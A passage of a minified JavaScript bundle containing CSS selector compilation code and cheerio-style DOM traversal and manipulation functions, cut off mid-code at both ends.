n=1;n<e.length;n++){const a=t[n];if(!(a<0))for(let s=n-1;s>=0&&a<t[s];s--){const r=e[s+1];e[s+1]=e[s],e[s]=r,t[s+1]=t[s],t[s]=a}}}function La(e){var t,n;let a=(t=Aa.get(e.type))!==null&&t!==void 0?t:-1;return e.type===S.Attribute?(a=(n=ro.get(e.action))!==null&&n!==void 0?n:4,e.action===J.Equals&&e.name==="id"&&(a=9),e.ignoreCase&&(a>>=1)):e.type===S.Pseudo&&(e.data?e.name==="has"||e.name==="contains"?a=0:Array.isArray(e.data)?(a=Math.min(...e.data.map(s=>Math.min(...s.map(La)))),a<0&&(a=0)):a=2:a=3),a}const po=/[-[\]{}()*+?.,\\^$|#\s]/g;function jn(e){return e.replace(po,"\\$&")}const lo=new Set(["accept","accept-charset","align","alink","axis","bgcolor","charset","checked","clear","codetype","color","compact","declare","defer","dir","direction","disabled","enctype","face","frame","hreflang","http-equiv","lang","language","link","media","method","multiple","nohref","noresize","noshade","nowrap","readonly","rel","rev","rules","scope","scrolling","selected","shape","target","text","type","valign","valuetype","vlink"]);function he(e,t){return typeof e.ignoreCase=="boolean"?e.ignoreCase:e.ignoreCase==="quirks"?!!t.quirksMode:!t.xmlMode&&lo.has(e.name)}const io={equals(e,t,n){const{adapter:a}=n,{name:s}=t;let{value:r}=t;return he(t,n)?(r=r.toLowerCase(),o=>{const p=a.getAttributeValue(o,s);return p!=null&&p.length===r.length&&p.toLowerCase()===r&&e(o)}):o=>a.getAttributeValue(o,s)===r&&e(o)},hyphen(e,t,n){const{adapter:a}=n,{name:s}=t;let{value:r}=t;const o=r.length;return he(t,n)?(r=r.toLowerCase(),function(l){const i=a.getAttributeValue(l,s);return i!=null&&(i.length===o||i.charAt(o)==="-")&&i.substr(0,o).toLowerCase()===r&&e(l)}):function(l){const i=a.getAttributeValue(l,s);return i!=null&&(i.length===o||i.charAt(o)==="-")&&i.substr(0,o)===r&&e(l)}},element(e,t,n){const{adapter:a}=n,{name:s,value:r}=t;if(/\s/.test(r))return R.falseFunc;const o=new RegExp(`(?:^|\\s)${jn(r)}(?:$|\\s)`,he(t,n)?"i":"");return function(l){const i=a.getAttributeValue(l,s);return i!=null&&i.length>=r.length&&o.test(i)&&e(l)}},exists(e,{name:t},{adapter:n}){return a=>n.hasAttrib(a,t)&&e(a)},start(e,t,n){const{adapter:a}=n,{name:s}=t;let{value:r}=t;const o=r.length;return o===0?R.falseFunc:he(t,n)?(r=r.toLowerCase(),p=>{const l=a.getAttributeValue(p,s);return l!=null&&l.length>=o&&l.substr(0,o).toLowerCase()===r&&e(p)}):p=>{var l;return!!(!((l=a.getAttributeValue(p,s))===null||l===void 0)&&l.startsWith(r))&&e(p)}},end(e,t,n){const{adapter:a}=n,{name:s}=t;let{value:r}=t;const o=-r.length;return o===0?R.falseFunc:he(t,n)?(r=r.toLowerCase(),p=>{var l;return((l=a.getAttributeValue(p,s))===null||l===void 0?void 0:l.substr(o).toLowerCase())===r&&e(p)}):p=>{var l;return!!(!((l=a.getAttributeValue(p,s))===null||l===void 0)&&l.endsWith(r))&&e(p)}},any(e,t,n){const{adapter:a}=n,{name:s,value:r}=t;if(r==="")return R.falseFunc;if(he(t,n)){const o=new RegExp(jn(r),"i");return function(l){const i=a.getAttributeValue(l,s);return i!=null&&i.length>=r.length&&o.test(i)&&e(l)}}return o=>{var p;return!!(!((p=a.getAttributeValue(o,s))===null||p===void 0)&&p.includes(r))&&e(o)}},not(e,t,n){const{adapter:a}=n,{name:s}=t;let{value:r}=t;return r===""?o=>!!a.getAttributeValue(o,s)&&e(o):he(t,n)?(r=r.toLowerCase(),o=>{const p=a.getAttributeValue(o,s);return(p==null||p.length!==r.length||p.toLowerCase()!==r)&&e(o)}):o=>a.getAttributeValue(o,s)!==r&&e(o)}},co=new Set([9,10,12,13,32]),Un=48,xo=57;function yo(e){if(e=e.trim().toLowerCase(),e==="even")return[2,0];if(e==="odd")return[2,1];let t=0,n=0,a=r(),s=o();if(t<e.length&&e.charAt(t)==="n"&&(t++,n=a*(s??1),p(),t<e.length?(a=r(),p(),s=o()):a=s=0),s===null||t<e.length)throw new Error(`n-th rule couldn't be parsed ('${e}')`);return[n,a*s];function r(){return e.charAt(t)==="-"?(t++,-1):(e.charAt(t)==="+"&&t++,1)}function o(){const l=t;let i=0;for(;t<e.length&&e.charCodeAt(t)>=Un&&e.charCodeAt(t)<=xo;)i=i*10+(e.charCodeAt(t)-Un),t++;return t===l?null:i}function p(){for(;t<e.length&&co.has(e.charCodeAt(t));)t++}}function wo(e){const t=e[0],n=e[1]-1;if(n<0&&t<=0)return R.falseFunc;if(t===-1)return r=>r<=n;if(t===0)return r=>r===n;if(t===1)return n<0?R.trueFunc:r=>r>=n;const a=Math.abs(t),s=(n%a+a)%a;return t>1?r=>r>=n&&r%a===s:r=>r<=n&&r%a===s}function nt(e){return wo(yo(e))}function at(e,t){return n=>{const a=t.getParent(n);return a!=null&&t.isTag(a)&&e(n)}}const qt={contains(e,t,{adapter:n}){return function(s){return e(s)&&n.getText(s).includes(t)}},icontains(e,t,{adapter:n}){const a=t.toLowerCase();return function(r){return e(r)&&n.getText(r).toLowerCase().includes(a)}},"nth-child"(e,t,{adapter:n,equals:a}){const s=nt(t);return s===R.falseFunc?R.falseFunc:s===R.trueFunc?at(e,n):function(o){const p=n.getSiblings(o);let l=0;for(let i=0;i<p.length&&!a(o,p[i]);i++)n.isTag(p[i])&&l++;return s(l)&&e(o)}},"nth-last-child"(e,t,{adapter:n,equals:a}){const s=nt(t);return s===R.falseFunc?R.falseFunc:s===R.trueFunc?at(e,n):function(o){const p=n.getSiblings(o);let l=0;for(let i=p.length-1;i>=0&&!a(o,p[i]);i--)n.isTag(p[i])&&l++;return s(l)&&e(o)}},"nth-of-type"(e,t,{adapter:n,equals:a}){const s=nt(t);return s===R.falseFunc?R.falseFunc:s===R.trueFunc?at(e,n):function(o){const p=n.getSiblings(o);let l=0;for(let i=0;i<p.length;i++){const d=p[i];if(a(o,d))break;n.isTag(d)&&n.getName(d)===n.getName(o)&&l++}return s(l)&&e(o)}},"nth-last-of-type"(e,t,{adapter:n,equals:a}){const s=nt(t);return s===R.falseFunc?R.falseFunc:s===R.trueFunc?at(e,n):function(o){const p=n.getSiblings(o);let l=0;for(let i=p.length-1;i>=0;i--){const d=p[i];if(a(o,d))break;n.isTag(d)&&n.getName(d)===n.getName(o)&&l++}return s(l)&&e(o)}},root(e,t,{adapter:n}){return a=>{const s=n.getParent(a);return(s==null||!n.isTag(s))&&e(a)}},scope(e,t,n,a){const{equals:s}=n;return!a||a.length===0?qt.root(e,t,n):a.length===1?r=>s(a[0],r)&&e(r):r=>a.includes(r)&&e(r)},hover:It("isHovered"),visited:It("isVisited"),active:It("isActive")};function It(e){return function(n,a,{adapter:s}){const r=s[e];return typeof r!="function"?R.falseFunc:function(p){return r(p)&&n(p)}}}const Jn={empty(e,{adapter:t}){return!t.getChildren(e).some(n=>t.isTag(n)||t.getText(n)!=="")},"first-child"(e,{adapter:t,equals:n}){if(t.prevElementSibling)return t.prevElementSibling(e)==null;const a=t.getSiblings(e).find(s=>t.isTag(s));return a!=null&&n(e,a)},"last-child"(e,{adapter:t,equals:n}){const a=t.getSiblings(e);for(let s=a.length-1;s>=0;s--){if(n(e,a[s]))return!0;if(t.isTag(a[s]))break}return!1},"first-of-type"(e,{adapter:t,equals:n}){const a=t.getSiblings(e),s=t.getName(e);for(let r=0;r<a.length;r++){const o=a[r];if(n(e,o))return!0;if(t.isTag(o)&&t.getName(o)===s)break}return!1},"last-of-type"(e,{adapter:t,equals:n}){const a=t.getSiblings(e),s=t.getName(e);for(let r=a.length-1;r>=0;r--){const o=a[r];if(n(e,o))return!0;if(t.isTag(o)&&t.getName(o)===s)break}return!1},"only-of-type"(e,{adapter:t,equals:n}){const a=t.getName(e);return t.getSiblings(e).every(s=>n(e,s)||!t.isTag(s)||t.getName(s)!==a)},"only-child"(e,{adapter:t,equals:n}){return t.getSiblings(e).every(a=>n(e,a)||!t.isTag(a))}};function Bn(e,t,n,a){if(n===null){if(e.length>a)throw new Error(`Pseudo-class :${t} requires an argument`)}else if(e.length===a)throw new Error(`Pseudo-class :${t} doesn't have any arguments`)}const fo={"any-link":":is(a, area, link)[href]",link:":any-link:not(:visited)",disabled:`:is(
        :is(button, input, select, textarea, optgroup, option)[disabled],
        optgroup[disabled] > option,
        fieldset[disabled]:not(fieldset[disabled] legend:first-of-type *)
    )`,enabled:":not(:disabled)",checked:":is(:is(input[type=radio], input[type=checkbox])[checked], option:selected)",required:":is(input, select, textarea)[required]",optional:":is(input, select, textarea):not([required])",selected:"option:is([selected], select:not([multiple]):not(:has(> option[selected])) > :first-of-type)",checkbox:"[type=checkbox]",file:"[type=file]",password:"[type=password]",radio:"[type=radio]",reset:"[type=reset]",image:"[type=image]",submit:"[type=submit]",parent:":not(:empty)",header:":is(h1, h2, h3, h4, h5, h6)",button:":is(button, input[type=button])",input:":is(input, textarea, select, button)",text:"input:is(:not([type!='']), [type=text])"},Da={};function uo(e,t){return e===R.falseFunc?R.falseFunc:n=>t.isTag(n)&&e(n)}function Ha(e,t){const n=t.getSiblings(e);if(n.length<=1)return[];const a=n.indexOf(e);return a<0||a===n.length-1?[]:n.slice(a+1).filter(t.isTag)}function zt(e){return{xmlMode:!!e.xmlMode,lowerCaseAttributeNames:!!e.lowerCaseAttributeNames,lowerCaseTags:!!e.lowerCaseTags,quirksMode:!!e.quirksMode,cacheResults:!!e.cacheResults,pseudos:e.pseudos,adapter:e.adapter,equals:e.equals}}const jt=(e,t,n,a,s)=>{const r=s(t,zt(n),a);return r===R.trueFunc?e:r===R.falseFunc?R.falseFunc:o=>r(o)&&e(o)},Ut={is:jt,matches:jt,where:jt,not(e,t,n,a,s){const r=s(t,zt(n),a);return r===R.falseFunc?e:r===R.trueFunc?R.falseFunc:o=>!r(o)&&e(o)},has(e,t,n,a,s){const{adapter:r}=n,o=zt(n);o.relativeSelector=!0;const p=t.some(d=>d.some(pn))?[Da]:void 0,l=s(t,o,p);if(l===R.falseFunc)return R.falseFunc;const i=uo(l,r);if(p&&l!==R.trueFunc){const{shouldTestNextSiblings:d=!1}=l;return f=>{if(!e(f))return!1;p[0]=f;const y=r.getChildren(f),h=d?[...y,...Ha(f,r)]:y;return r.existsOne(i,h)}}return d=>e(d)&&r.existsOne(i,r.getChildren(d))}};function ho(e,t,n,a,s){var r;const{name:o,data:p}=t;if(Array.isArray(p)){if(!(o in Ut))throw new Error(`Unknown pseudo-class :${o}(${p})`);return Ut[o](e,p,n,a,s)}const l=(r=n.pseudos)===null||r===void 0?void 0:r[o],i=typeof l=="string"?l:fo[o];if(typeof i=="string"){if(p!=null)throw new Error(`Pseudo ${o} doesn't have any arguments`);const d=bt(i);return Ut.is(e,d,n,a,s)}if(typeof l=="function")return Bn(l,o,p,1),d=>l(d,p)&&e(d);if(o in qt)return qt[o](e,p,n,a);if(o in Jn){const d=Jn[o];return Bn(d,o,p,2),f=>d(f,n,p)&&e(f)}throw new Error(`Unknown pseudo-class :${o}`)}function Jt(e,t){const n=t.getParent(e);return n&&t.isTag(n)?n:null}function go(e,t,n,a,s){const{adapter:r,equals:o}=n;switch(t.type){case S.PseudoElement:throw new Error("Pseudo-elements are not supported by css-select");case S.ColumnCombinator:throw new Error("Column combinators are not yet supported by css-select");case S.Attribute:{if(t.namespace!=null)throw new Error("Namespaced attributes are not yet supported by css-select");return(!n.xmlMode||n.lowerCaseAttributeNames)&&(t.name=t.name.toLowerCase()),io[t.action](e,t,n)}case S.Pseudo:return ho(e,t,n,a,s);case S.Tag:{if(t.namespace!=null)throw new Error("Namespaced tag names are not yet supported by css-select");let{name:p}=t;return(!n.xmlMode||n.lowerCaseTags)&&(p=p.toLowerCase()),function(i){return r.getName(i)===p&&e(i)}}case S.Descendant:{if(n.cacheResults===!1||typeof WeakSet>"u")return function(i){let d=i;for(;d=Jt(d,r);)if(e(d))return!0;return!1};const p=new WeakSet;return function(i){let d=i;for(;d=Jt(d,r);)if(!p.has(d)){if(r.isTag(d)&&e(d))return!0;p.add(d)}return!1}}case"_flexibleDescendant":return function(l){let i=l;do if(e(i))return!0;while(i=Jt(i,r));return!1};case S.Parent:return function(l){return r.getChildren(l).some(i=>r.isTag(i)&&e(i))};case S.Child:return function(l){const i=r.getParent(l);return i!=null&&r.isTag(i)&&e(i)};case S.Sibling:return function(l){const i=r.getSiblings(l);for(let d=0;d<i.length;d++){const f=i[d];if(o(l,f))break;if(r.isTag(f)&&e(f))return!0}return!1};case S.Adjacent:return r.prevElementSibling?function(l){const i=r.prevElementSibling(l);return i!=null&&e(i)}:function(l){const i=r.getSiblings(l);let d;for(let f=0;f<i.length;f++){const y=i[f];if(o(l,y))break;r.isTag(y)&&(d=y)}return!!d&&e(d)};case S.Universal:{if(t.namespace!=null&&t.namespace!=="*")throw new Error("Namespaced universal selectors are not yet supported by css-select");return e}}}function Ia(e){return e.type===S.Pseudo&&(e.name==="scope"||Array.isArray(e.data)&&e.data.some(t=>t.some(Ia)))}const mo={type:S.Descendant},ko={type:"_flexibleDescendant"},Wo={type:S.Pseudo,name:"scope",data:null};function So(e,{adapter:t},n){const a=!!(n!=null&&n.every(s=>{const r=t.isTag(s)&&t.getParent(s);return s===Da||r&&t.isTag(r)}));for(const s of e){if(!(s.length>0&&pn(s[0])&&s[0].type!==S.Descendant))if(a&&!s.some(Ia))s.unshift(mo);else continue;s.unshift(Wo)}}function ja(e,t,n){var a;e.forEach(oo),n=(a=t.context)!==null&&a!==void 0?a:n;const s=Array.isArray(n),r=n&&(Array.isArray(n)?n:[n]);if(t.relativeSelector!==!1)So(e,t,r);else if(e.some(l=>l.length>0&&pn(l[0])))throw new Error("Relative selectors are not allowed when the `relativeSelector` option is disabled");let o=!1;const p=e.map(l=>{if(l.length>=2){const[i,d]=l;i.type!==S.Pseudo||i.name!=="scope"||(s&&d.type===S.Descendant?l[1]=ko:(d.type===S.Adjacent||d.type===S.Sibling)&&(o=!0))}return bo(l,t,r)}).reduce(To,R.falseFunc);return p.shouldTestNextSiblings=o,p}function bo(e,t,n){var a;return e.reduce((s,r)=>s===R.falseFunc?R.falseFunc:go(s,r,t,n,ja),(a=t.rootFunc)!==null&&a!==void 0?a:R.trueFunc)}function To(e,t){return t===R.falseFunc||e===R.trueFunc?e:e===R.falseFunc||t===R.trueFunc?t:function(a){return e(a)||t(a)}}const Ua=(e,t)=>e===t,Co={adapter:St,equals:Ua};function Po(e){var t,n,a,s;const r=e??Co;return(t=r.adapter)!==null&&t!==void 0||(r.adapter=St),(n=r.equals)!==null&&n!==void 0||(r.equals=(s=(a=r.adapter)===null||a===void 0?void 0:a.equals)!==null&&s!==void 0?s:Ua),r}function vo(e){return function(n,a,s){const r=Po(a);return e(n,r,s)}}const ln=vo(ja);function Ja(e,t,n=!1){return n&&(e=Ro(e,t)),Array.isArray(e)?t.removeSubsets(e):t.getChildren(e)}function Ro(e,t){const n=Array.isArray(e)?e.slice(0):[e],a=n.length;for(let s=0;s<a;s++){const r=Ha(n[s],t);n.push(...r)}return n}const Eo=new Set(["first","last","eq","gt","nth","lt","even","odd"]);function wt(e){return e.type!=="pseudo"?!1:Eo.has(e.name)?!0:e.name==="not"&&Array.isArray(e.data)?e.data.some(t=>t.some(wt)):!1}function Mo(e,t,n){const a=t!=null?parseInt(t,10):NaN;switch(e){case"first":return 1;case"nth":case"eq":return isFinite(a)?a>=0?a+1:1/0:0;case"lt":return isFinite(a)?a>=0?Math.min(a,n):1/0:0;case"gt":return isFinite(a)?1/0:0;case"odd":return 2*n;case"even":return 2*n-1;case"last":case"not":return 1/0}}function Oo(e){for(;e.parent;)e=e.parent;return e}function cn(e){const t=[],n=[];for(const a of e)a.some(wt)?t.push(a):n.push(a);return[n,t]}const _o={type:S.Universal,namespace:null},No={type:S.Pseudo,name:"scope",data:null};function Ba(e,t,n={}){return Fa([e],t,n)}function Fa(e,t,n={}){if(typeof t=="function")return e.some(t);const[a,s]=cn(bt(t));return a.length>0&&e.some(ln(a,n))||s.some(r=>za(r,e,n).length>0)}function Ao(e,t,n,a){const s=typeof n=="string"?parseInt(n,10):NaN;switch(e){case"first":case"lt":return t;case"last":return t.length>0?[t[t.length-1]]:t;case"nth":case"eq":return isFinite(s)&&Math.abs(s)<t.length?[s<0?t[t.length+s]:t[s]]:[];case"gt":return isFinite(s)?t.slice(s+1):[];case"even":return t.filter((r,o)=>o%2===0);case"odd":return t.filter((r,o)=>o%2===1);case"not":{const r=new Set(qa(n,t,a));return t.filter(o=>!r.has(o))}}}function Va(e,t,n={}){return qa(bt(e),t,n)}function qa(e,t,n){if(t.length===0)return[];const[a,s]=cn(e);let r;if(a.length){const o=Xt(t,a,n);if(s.length===0)return o;o.length&&(r=new Set(o))}for(let o=0;o<s.length&&(r==null?void 0:r.size)!==t.length;o++){const p=s[o];if((r?t.filter(d=>C(d)&&!r.has(d)):t).length===0)break;const i=za(p,t,n);if(i.length)if(r)i.forEach(d=>r.add(d));else{if(o===s.length-1)return i;r=new Set(i)}}return typeof r<"u"?r.size===t.length?t:t.filter(o=>r.has(o)):[]}function za(e,t,n){var a;if(e.some(Ue)){const s=(a=n.root)!==null&&a!==void 0?a:Oo(t[0]),r={...n,context:t,relativeSelector:!1};return e.push(No),ft(s,e,r,!0,t.length)}return ft(t,e,n,!1,t.length)}function Lo(e,t,n={},a=1/0){if(typeof e=="function")return $a(t,e);const[s,r]=cn(bt(e)),o=r.map(p=>ft(t,p,n,!0,a));return s.length&&o.push($t(t,s,n,a)),o.length===0?[]:o.length===1?o[0]:Ae(o.reduce((p,l)=>[...p,...l]))}function ft(e,t,n,a,s){const r=t.findIndex(wt),o=t.slice(0,r),p=t[r],l=t.length-1===r?s:1/0,i=Mo(p.name,p.data,l);if(i===0)return[];const f=(o.length===0&&!Array.isArray(e)?Wt(e).filter(C):o.length===0?(Array.isArray(e)?e:[e]).filter(C):a||o.some(Ue)?$t(e,[o],n,i):Xt(e,[o],n)).slice(0,i);let y=Ao(p.name,f,p.data,n);if(y.length===0||t.length===r+1)return y;const h=t.slice(r+1),m=h.some(Ue);if(m){if(Ue(h[0])){const{type:b}=h[0];(b===S.Sibling||b===S.Adjacent)&&(y=Ja(y,St,!0)),h.unshift(_o)}n={...n,relativeSelector:!1,rootFunc:b=>y.includes(b)}}else n.rootFunc&&n.rootFunc!==yt.trueFunc&&(n={...n,rootFunc:yt.trueFunc});return h.some(wt)?ft(y,h,n,!1,s):m?$t(y,[h],n,s):Xt(y,[h],n)}function $t(e,t,n,a){const s=ln(t,n,e);return $a(e,s,a)}function $a(e,t,n=1/0){const a=Ja(e,St,t.shouldTestNextSiblings);return an(s=>C(s)&&t(s),a,!0,n)}function Xt(e,t,n){const a=(Array.isArray(e)?e:[e]).filter(C);if(a.length===0)return a;const s=ln(t,n);return s===yt.trueFunc?a:a.filter(s)}const Do=/^\s*[+~]/;function Ho(e){if(!e)return this._make([]);if(typeof e!="string"){const t=Le(e)?e.toArray():[e],n=this.toArray();return this._make(t.filter(a=>n.some(s=>Ur(s,a))))}return this._findBySelector(e,Number.POSITIVE_INFINITY)}function Io(e,t){var n;const a=this.toArray(),s=Do.test(e)?a:this.children().toArray(),r={context:a,root:(n=this._root)===null||n===void 0?void 0:n[0],xmlMode:this.options.xmlMode,lowerCaseTags:this.options.lowerCaseTags,lowerCaseAttributeNames:this.options.lowerCaseAttributeNames,pseudos:this.options.pseudos,quirksMode:this.options.quirksMode};return this._make(Lo(e,s,r,t))}function dn(e){return function(t,...n){return function(a){var s;let r=e(t,this);return a&&(r=wn(r,a,this.options.xmlMode,(s=this._root)===null||s===void 0?void 0:s[0])),this._make(this.length>1&&r.length>1?n.reduce((o,p)=>p(o),r):r)}}}const Ge=dn((e,t)=>{let n=[];for(let a=0;a<t.length;a++){const s=e(t[a]);s.length>0&&(n=n.concat(s))}return n}),xn=dn((e,t)=>{const n=[];for(let a=0;a<t.length;a++){const s=e(t[a]);s!==null&&n.push(s)}return n});function yn(e,...t){let n=null;const a=dn((s,r)=>{const o=[];return H(r,p=>{for(let l;(l=s(p))&&!(n!=null&&n(l,o.length));p=l)o.push(l)}),o})(e,...t);return function(s,r){n=typeof s=="string"?p=>Ba(p,s,this.options):s?Ye(s):null;const o=a.call(this,r);return n=null,o}}function De(e){return e.length>1?Array.from(new Set(e)):e}const jo=xn(({parent:e})=>e&&!_e(e)?e:null,De),Uo=Ge(e=>{const t=[];for(;e.parent&&!_e(e.parent);)t.push(e.parent),e=e.parent;return t},Ae,e=>e.reverse()),Jo=yn(({parent:e})=>e&&!_e(e)?e:null,Ae,e=>e.reverse());function Bo(e){var t;const n=[];if(!e)return this._make(n);const a={xmlMode:this.options.xmlMode,root:(t=this._root)===null||t===void 0?void 0:t[0]},s=typeof e=="string"?r=>Ba(r,e,a):Ye(e);return H(this,r=>{for(r&&!_e(r)&&!C(r)&&(r=r.parent);r&&C(r);){if(s(r,0)){n.includes(r)||n.push(r);break}r=r.parent}}),this._make(n)}const Fo=xn(e=>tn(e)),Vo=Ge(e=>{const t=[];for(;e.next;)e=e.next,C(e)&&t.push(e);return t},De),qo=yn(e=>tn(e),De),zo=xn(e=>nn(e)),$o=Ge(e=>{const t=[];for(;e.prev;)e=e.prev,C(e)&&t.push(e);return t},De),Xo=yn(e=>nn(e),De),Go=Ge(e=>Sa(e).filter(t=>C(t)&&t!==e),Ae),Yo=Ge(e=>Wt(e).filter(C),De);function Ko(){const e=this.toArray().reduce((t,n)=>I(n)?t.concat(n.children):t,[]);return this._make(e)}function Qo(e){let t=0;const n=this.length;for(;t<n&&e.call(this[t],t,this[t])!==!1;)++t;return this}function Zo(e){let t=[];for(let n=0;n<this.length;n++){const a=this[n],s=e.call(a,n,a);s!=null&&(t=t.concat(s))}return this._make(t)}function Ye(e){return typeof e=="function"?(t,n)=>e.call(t,n,t):Le(e)?t=>Array.prototype.includes.call(e,t):function(t){return e===t}}function ep(e){var t;return this._make(wn(this.toArray(),e,this.options.xmlMode,(t=this._root)===null||t===void 0?void 0:t[0]))}function wn(e,t,n,a){return typeof t=="string"?Va(t,e,{xmlMode:n,root:a}):e.filter(Ye(t))}function tp(e){const t=this.toArray();return typeof e=="string"?Fa(t.filter(C),e,this.options):e?t.some(Ye(e)):!1}function np(e){let t=this.toArray();if(typeof e=="string"){const n=new Set(Va(e,t,this.options));t=t.filter(a=>!n.has(a))}else{const n=Ye(e);t=t.filter((a,s)=>!n(a,s))}return this._make(t)}function ap(e){return this.filter(typeof e=="string"?`:has(${e})`:(t,n)=>this._make(n).find(e).length>0)}function sp(){return this.length>1?this._make(this[0]):this}function rp(){return this.length>0?this._make(this[this.length-1]):this}function op(e){var t;return e=+e,e===0&&this.length<=1?this:(e<0&&(e=this.length+e),this._make((t=this[e])!==null&&t!==void 0?t:[]))}function pp(e){return e==null?this.toArray():this[e<0?this.length+e:e]}function lp(){return Array.prototype.slice.call(this)}function ip(e){let t,n;return e==null?(t=this.parent().children(),n=this[0]):typeof e=="string"?(t=this._make(e),n=this[0]):(t=this,n=Le(e)?e[0]:e),Array.prototype.indexOf.call(t,n)}function cp(e,t){return this._make(Array.prototype.slice.call(this,e,t))}function dp(){var e;return(e=this.prevObject)!==null&&e!==void 0?e:this._make([])}function xp(e,t){const n=this._make(e,t),a=Ae([...this.get(),...n.get()]);return this._make(a)}function yp(e){return this.prevObject?this.add(e?this.prevObject.filter(e):this.prevObject):this}const wp=Object.freeze(Object.defineProperty({__proto__:null,_findBySelector:Io,add:xp,addBack:yp,children:Yo,closest:Bo,contents:Ko,each:Qo,end:dp,eq:op,filter:ep,filterArray:wn,find:Ho,first:sp,get:pp,has:ap,index:ip,is:tp,last:rp,map:Zo,next:Fo,nextAll:Vo,nextUntil:qo,not:np,parent:jo,parents:Uo,parentsUntil:Jo,prev:zo,prevAll:$o,prevUntil:Xo,siblings:Go,slice:cp,toArray:lp},Symbol.toStringTag,{value:"Module"}));function Me(e,t){const n=Array.isArray(e)?e:[e];t?t.children=n:t=null;for(let a=0;a<n.length;a++){const s=n[a];s.parent&&s.parent.children!==n&&Se(s),t?(s.prev=n[a-1]||null,s.next=n[a+1]||null):s.prev=s.next=null,s.parent=t}return t}function fp(e,t){if(e==null)return[];if(typeof e=="string")return this._parse(e,this.options,!1,null).children.slice(0);if("length"in e){if(e.length===1)return this._makeDomArray(e[0],t);const n=[];for(let a=0;a<e.length;a++){const s=e[a];if(typeof s=="object"){if(s==null)continue;if(!("length"in s)){n.push(t?Fe(s,!0):s);continue}}n.push(...this._makeDomArray(s,t))}return n}return[t?Fe(e,!0):e]}function Xa(e){return function(...t){const n=this.length-1;return H(this,(a,s)=>{if(!I(a))return;const r=typeof t[0]=="function"?t[0].call(a,s,this._render(a.children)):t,o=this._makeDomArray(r,s<n);e(o,a.children,a)})}}function ye(e,t,n,a,s){var r,o;const p=[t,n,...a],l=t===0?null:e[t-1],i=t+n>=e.length?null:e[t+n];for(let d=0;d<a.length;++d){const f=a[d],y=f.parent;if(y){const m=y.children.indexOf(f);m>-1&&(y.children.splice(m,1),s===y&&t>m&&p[0]--)}f.parent=s,f.prev&&(f.prev.next=(r=f.next)!==null&&r!==void 0?r:null),f.next&&(f.next.prev=(o=f.prev)!==null&&o!==void 0?o:null),f.prev=d===0?l:a[d-1],f.next=d===a.length-1?i:a[d+1]}return l&&(l.next=a[0]),i&&(i.prev=a[a.length-1]),e.splice(...p)}function up(e){return(Le(e)?e:this._make(e)).append(this),this}function hp(e){return(Le(e)?e:this._make(e)).prepend(this),this}const gp=Xa((e,t,n)=>{ye(t,t.length,0,e,n)}),mp=Xa((e,t,n)=>{ye(t,0,0,e,n)});function Ga(e){return function(t){const n=this.length-1,a=this.parents().last();for(let s=0;s<this.length;s++){const r=this[s],o=typeof t=="function"?t.call(r,s,r):typeof t=="string"&&!Fr(t)?a.find(t).clone():t,[p]=this._makeDomArray(o,s<n);if(!p||!I(p))continue;let l=p,i=0;for(;i<l.children.length;){const d=l.children[i];C(d)?(l=d,i=0):i++}e(r,l,[p])}return this}}const kp=Ga((e,t,n)=>{const{parent:a}=e;if(!a)return;const s=a.children,r=s.indexOf(e);Me([e],t),ye(s,r,0,n,a)}),Wp=Ga((e,t,n)=>{I(e)&&(Me(e.children,t),Me(n,e))});function Sp(e){return this.parent(e).not("body").each((t,n)=>{this._make(n).replaceWith(n.children)}),this}function bp(e){const t=this[0];if(t){const n=this._make(typeof e=="function"?e.call(t,0,t):e).insertBefore(t);let a;for(let r=0;r<n.length;r++)n[r].type==="tag"&&(a=n[r]);let s=0;for(;a&&s<a.children.length;){const r=a.children[s];r.type==="tag"?(a=r,s=0):s++}a&&this._make(a).append(this)}return this}function Tp(...e){const t=this.length-1;return H(this,(n,a)=>{if(!I(n)||!n.parent)return;const s=n.parent.children,r=s.indexOf(n);if(r<0)return;const o=typeof e[0]=="function"?e[0].call(n,a,this._render(n.children)):e,p=this._makeDomArray(o,a<t);ye(s,r+1,0,p,n.parent)})}function Cp(e){typeof e=="string"&&(e=this._make(e)),this.remove();const t=[];for(const n of this._makeDomArray(e)){const a=this.clone().toArray(),{parent:s}=n;if(!s)continue;const r=s.children,o=r.indexOf(n);o<0||(ye(r,o+1,0,a,s),t.push(...a))}return this._make(t)}function Pp(...e){const t=this.length-1;return H(this,(n,a)=>{if(!I(n)||!n.parent)return;const s=n.parent.children,r=s.indexOf(n);if(r<0)return;const o=typeof e[0]=="function"?e[0].call(n,a,this._render(n.children)):e,p=this._makeDomArray(o,a<t);ye(s,r,0,p,n.parent)})}function vp(e){const t=this._make(e);this.remove();const n=[];return H(t,a=>{const s=this.clone().toArray(),{parent:r}=a;if(!r)return;const o=r.children,p=o.indexOf(a);p<0||(ye(o,p,0,s,r),n.push(...s))}),this._make(n)}function Rp(e){const t=e?this.filter(e):this;return H(t,n=>{Se(n),n.prev=n.next=n.parent=null}),this}function Ep(e){return H(this,(t,n)=>{const{parent:a}=t;if(!a)return;const s=a.children,r=typeof e=="function"?e.call(t,n,t):e,o=this._makeDomArray(r);Me(o,null);const p=s.indexOf(t);ye(s,p,1,o,a),o.includes(t)||(t.parent=t.prev=t.next=null)})}function Mp(){return H(this,e=>{if(I(e)){for(const t of e.children)t.next=t.prev=t.parent=null;e.children.length=0}})}function Op(e){if(e===void 0){const t=this[0];return!t||!I(t)?null:this._render(t.children)}return H(this,t=>{if(!I(t))return;for(const a of t.children)a.next=a.prev=a.parent=null;const n=Le(e)?e.toArray():this._parse(`${e}`,this.options,!1,t).children;Me(n,t)})}function _p(){return this._render(this)}function Np(e){return e===void 0?ct(this):typeof e=="function"?H(this,(t,n)=>this._make(t).text(e.call(t,n,ct([t])))):H(this,t=>{if(!I(t))return;for(const a of t.children)a.next=a.prev=a.parent=null;const n=new ua(`${e}`);Me(n,t)})}function Ap(){const e=Array.prototype.map.call(this.get(),n=>Fe(n,!0)),t=new ha(e);for(const n of e)n.parent=t;return this._make(e)}const Lp=Object.freeze(Object.defineProperty({__proto__:null,_makeDomArray:fp,after:Tp,append:gp,appendTo:up,before:Pp,clone:Ap,empty:Mp,html:Op,insertAfter:Cp,insertBefore:vp,prepend:mp,prependTo:hp,remove:Rp,replaceWith:Ep,text:Np,toString:_p,unwrap:Sp,wrap:kp,wrapAll:bp,wrapInner:Wp},Symbol.toStringTag,{value:"Module"}));function Dp(e,t){if(e!=null&&t!=null||typeof e=="object"&&!Array.isArray(e))return H(this,(n,a)=>{C(n)&&Ya(n,e,t,a)});if(this.length!==0)return Ka(this[0],e)}function Ya(e,t,n,a){if(typeof t=="string"){const s=Ka(e),r=typeof n=="function"?n.call(e,a,s[t]):n;r===""?delete 